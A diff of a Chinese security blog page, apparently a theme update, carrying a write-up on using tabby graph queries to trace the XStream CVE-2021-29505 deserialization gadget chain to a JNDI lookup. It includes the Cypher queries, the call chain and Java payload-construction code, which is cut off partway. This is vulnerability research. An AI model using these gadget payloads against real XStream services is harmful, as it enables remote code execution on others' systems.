@@ -1,237 +1,76 @@
-<!DOCTYPE html>
-<html lang=en>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="写在前面tabby熟悉便从作者的xstream挖掘cve开始 给出一个tabby查询模板 1234match (source:Method) &#x2F;&#x2F; 添加where语句限制source函数match (sink:Method &amp;#123;IS_SINK:true&amp;#125;) &#x2F;&#x2F; 添加where语句限制sink函数call apoc.algo.allSimplePaths(m1, source,">
-<meta property="og:type" content="article">
-<meta property="og:title" content="XStream与tabby">
-<meta property="og:url" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/index.html">
-<meta property="og:site_name" content="RacerZ">
-<meta property="og:description" content="写在前面tabby熟悉便从作者的xstream挖掘cve开始 给出一个tabby查询模板 1234match (source:Method) &#x2F;&#x2F; 添加where语句限制source函数match (sink:Method &amp;#123;IS_SINK:true&amp;#125;) &#x2F;&#x2F; 添加where语句限制sink函数call apoc.algo.allSimplePaths(m1, source,">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221117101918598.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221117102027338.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221117102237468.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221117150159330.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105300053.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105424714.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105652123.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105811425.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221117112237729.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221117112405268.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221117153028061.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113642917.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113806220.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113937702.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221118200924654.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113034467.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113204066.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113227430.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113821197.png">
-<meta property="article:published_time" content="2022-11-09T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-11-25T16:06:03.796Z">
-<meta property="article:author" content="RacerZ">
-<meta property="article:tag" content="JAVA安全">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/image-20221117101918598.png">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>XStream与tabby</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-<!-- hexo injector head_end start -->
+<!DOCTYPE html><html lang="en" theme-mode="auto"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>XStream与tabby | RacerZ</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light' || window.matchMedia('(prefers-color-scheme:light)').matches) document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark' || window.matchMedia('(prefers-color-scheme:dark)').matches) document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><!-- hexo injector head_end start -->
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
-<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
-     --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
-     --><!--
-       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="Previous post" href="/2022/11/11/21%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E4%BD%93%E8%B5%9B%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="Next post" href="/2022/11/06/21%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%B5%9B%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&text=XStream与tabby"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&title=XStream与tabby"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&is_video=false&description=XStream与tabby"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=XStream与tabby&body=Check out this article: https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&title=XStream与tabby"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&title=XStream与tabby"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&title=XStream与tabby"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&title=XStream与tabby"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&name=XStream与tabby&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2022/11/10/xstream%E4%B8%8Etabby/&t=XStream与tabby"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EXStream-1-4-16-CVE-2021-29505%E7%9A%84%E6%8E%A2%E7%B4%A2"><span class="toc-number">2.</span> <span class="toc-text">基于XStream-1.4.16 CVE-2021-29505的探索</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XStream-1-4-17%E9%99%90%E5%88%B6"><span class="toc-number">3.</span> <span class="toc-text">XStream 1.4.17限制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.1.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        XStream与tabby
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">RacerZ</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2022-11-09T16:00:00.000Z" itemprop="datePublished">2022-11-10</time>
-        
-      
-    </div>
-
-
-      
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link-link" href="/tags/JAVA%E5%AE%89%E5%85%A8/" rel="tag">JAVA安全</a>
-    </div>
-
-
-    </div>
-  </header>
-  
-
-  <div class="content" itemprop="articleBody">
-    <h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>tabby熟悉便从作者的xstream挖掘cve开始</p>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>XStream与tabby</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2022-11-09T16:00:00.000Z" id="date"> 2022-11-10</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-11-25T16:06:03.796Z" id="updated"> 2022-11-26</time></div></span></div></div><hr><div id="post-content"><h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>tabby熟悉便从作者的xstream挖掘cve开始</p>
 <p>给出一个tabby查询模板</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) // 添加where语句限制source函数</span><br><span class="line">match (sink:Method &#123;IS_SINK:true&#125;) // 添加where语句限制sink函数</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 12) yield path // 查找具体路径,12代表深度，可以修改</span><br><span class="line">return * limit 20</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs neo4j">match (source:Method) // 添加where语句限制source函数<br>match (sink:Method &#123;IS_SINK:true&#125;) // 添加where语句限制sink函数<br>call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 12) yield path // 查找具体路径,12代表深度，可以修改<br>return * limit 20<br></code></pre></td></tr></table></figure>
 <p>根据作者的一条链子，我们直接增加限制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;compare&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;IS_SINK:true, NAME:&quot;invoke&quot;&#125;)&lt;-[:CALL]-(m1:Method &#123;NAME: &quot;createValue&quot;&#125;)</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 12) yield path </span><br><span class="line">return * limit 20</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117101918598.png" alt="image-20221117101918598"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">match (source:Method &#123;NAME:&quot;compare&quot;&#125;)<br>match (sink:Method &#123;IS_SINK:true, NAME:&quot;invoke&quot;&#125;)&lt;-[:CALL]-(m1:Method &#123;NAME: &quot;createValue&quot;&#125;)<br>call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 12) yield path <br>return * limit 20<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117101918598.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117101918598.png" alt="image-20221117101918598"></p>
 <p>关键调用sink点的函数为<code>sun.swing.SwingLazyValue#createValue()</code></p>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117102027338.png" alt="image-20221117102027338"></p>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117102027338.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117102027338.png" alt="image-20221117102027338"></p>
 <p>该函数可以看到可以导入一个任意类并调用其静态函数或者构造函数，其中的类名、方法名以及参数名均可控</p>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117102237468.png" alt="image-20221117102237468"></p>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117102237468.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117102237468.png" alt="image-20221117102237468"></p>
 <p>通过查询，下面这个类的静态函数可以直接JNDI注入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;IS_PUBLIC:true, IS_STATIC:true&#125;)</span><br><span class="line">match (sink:Method &#123;IS_SINK: true, NAME:&quot;lookup&quot;&#125;)</span><br><span class="line">call apoc.algo.allSimplePaths(sink, source, &quot;&lt;CALL|ALIA&quot;, 8) yield path</span><br><span class="line">return path limit 20</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117150159330.png" alt="image-20221117150159330"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs neo4j">match (source:Method &#123;IS_PUBLIC:true, IS_STATIC:true&#125;)<br>match (sink:Method &#123;IS_SINK: true, NAME:&quot;lookup&quot;&#125;)<br>call apoc.algo.allSimplePaths(sink, source, &quot;&lt;CALL|ALIA&quot;, 8) yield path<br>return path limit 20<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117150159330.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117150159330.png" alt="image-20221117150159330"></p>
 <p><code>&lt;javax.naming.InitialContext: java.lang.Object doLookup(java.lang.String)&gt;</code></p>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105300053.png" alt="image-20221117105300053"></p>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105300053.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105300053.png" alt="image-20221117105300053"></p>
 <p>往上回溯调用链，定位<code>javax.swing.UIDefaults#getFromHashtable()</code></p>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105424714.png" alt="image-20221117105424714"></p>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105424714.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105424714.png" alt="image-20221117105424714"></p>
 <p>这里value值可以手动填充，并且可以直接构造成<code>sun.swing.SwingLazyValue</code>就能够执行createValue方法</p>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105652123.png" alt="image-20221117105652123"></p>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105652123.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105652123.png" alt="image-20221117105652123"></p>
 <p>继续往上回溯<code>javax.swing.UIDefaults#get</code>，这里没有阻碍点</p>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105811425.png" alt="image-20221117105811425"></p>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105811425.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105811425.png" alt="image-20221117105811425"></p>
 <p><code>javax.swing.MultiUIDefaults#get</code>，这里我jdk就没有扫到了不知道为啥，先看下。这里既可以通过替换类属性tables，也可以直接替换hashtable本身的value值</p>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117112237729.png" alt="image-20221117112237729"></p>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117112237729.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117112237729.png" alt="image-20221117112237729"></p>
 <p><code>javax.swing.MultiUIDefaults#toString</code>，这里会遍历table中的key，所以一定会触发get</p>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117112405268.png" alt="image-20221117112405268"></p>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117112405268.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117112405268.png" alt="image-20221117112405268"></p>
 <p>继续往上找调用了toString的链子。从头开始分析，<code>javax.naming.ldap.Rdn$RdnEntry#compareTo</code>，类属性调用了equals方法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compareTo&quot;]</span><br><span class="line">match (sink:Method &#123;NAME:&quot;toString&quot;&#125;)&lt;-[r:CALL]-(m1:Method) where r.REAL_CALL_TYPE in [&quot;java.lang.Object&quot;]</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 5) yield path</span><br><span class="line">return path limit 20</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117153028061.png" alt="image-20221117153028061"></p>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113642917.png" alt="image-20221117113642917"></p>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113806220.png" alt="image-20221117113806220"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs neo4j">match (source:Method) where source.NAME in [&quot;compareTo&quot;]<br>match (sink:Method &#123;NAME:&quot;toString&quot;&#125;)&lt;-[r:CALL]-(m1:Method) where r.REAL_CALL_TYPE in [&quot;java.lang.Object&quot;]<br>call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 5) yield path<br>return path limit 20<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117153028061.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117153028061.png" alt="image-20221117153028061"></p>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113642917.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113642917.png" alt="image-20221117113642917"></p>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113806220.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113806220.png" alt="image-20221117113806220"></p>
 <p><code>com.sun.org.apache.xpath.internal.objects.XString#equals()</code></p>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113937702.png" alt="image-20221117113937702"></p>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113937702.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113937702.png" alt="image-20221117113937702"></p>
 <p>贴一下整个调用链</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.ldap.Rdn$RdnEntry.compareTo ??</span><br><span class="line">    com.sun.org.apache.xpath.internal.objects.XString.equal</span><br><span class="line">        javax.swing.MultiUIDefaults.toString ??</span><br><span class="line">            UIDefaults.get ??</span><br><span class="line">                UIDefaults.getFromHashTable</span><br><span class="line">                    UIDefaults$LazyValue.createValue</span><br><span class="line">                    SwingLazyValue.createValue</span><br><span class="line">                        javax.naming.InitialContext.doLookup()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">javax.naming.ldap.Rdn$RdnEntry.compareTo ??<br>    com.sun.org.apache.xpath.internal.objects.XString.equal<br>        javax.swing.MultiUIDefaults.toString ??<br>            UIDefaults.get ??<br>                UIDefaults.getFromHashTable<br>                    UIDefaults$LazyValue.createValue<br>                    SwingLazyValue.createValue<br>                        javax.naming.InitialContext.doLookup()<br></code></pre></td></tr></table></figure>
 <p>因此关键构造如下所示</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line"><span class="type">Object</span> <span class="variable">multiUIDefaults</span> <span class="operator">=</span></span><br><span class="line">  ReflectionHelper.newInstance(<span class="string">&quot;javax.swing.MultiUIDefaults&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">UIDefaults</span>[]&#123;uiDefaults&#125;&#125;);</span><br><span class="line">uiDefaults.put(<span class="string">&quot;lazyValue&quot;</span>, obj);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">rdnEntry1</span> <span class="operator">=</span> ReflectionHelper.newInstance(<span class="string">&quot;javax.naming.ldap.Rdn$RdnEntry&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">ReflectionHelper.setFieldValue(rdnEntry1, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;ysomap&quot;</span>);</span><br><span class="line">ReflectionHelper.setFieldValue(rdnEntry1, <span class="string">&quot;value&quot;</span>, <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;test&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">rdnEntry2</span> <span class="operator">=</span> ReflectionHelper.newInstance(<span class="string">&quot;javax.naming.ldap.Rdn$RdnEntry&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">ReflectionHelper.setFieldValue(rdnEntry2, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;ysomap&quot;</span>);</span><br><span class="line">ReflectionHelper.setFieldValue(rdnEntry2, <span class="string">&quot;value&quot;</span>, multiUIDefaults);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1);</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br><span class="hljs-type">Object</span> <span class="hljs-variable">multiUIDefaults</span> <span class="hljs-operator">=</span><br>  ReflectionHelper.newInstance(<span class="hljs-string">&quot;javax.swing.MultiUIDefaults&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>[]&#123;uiDefaults&#125;&#125;);<br>uiDefaults.put(<span class="hljs-string">&quot;lazyValue&quot;</span>, obj);<br><br><span class="hljs-type">Object</span> <span 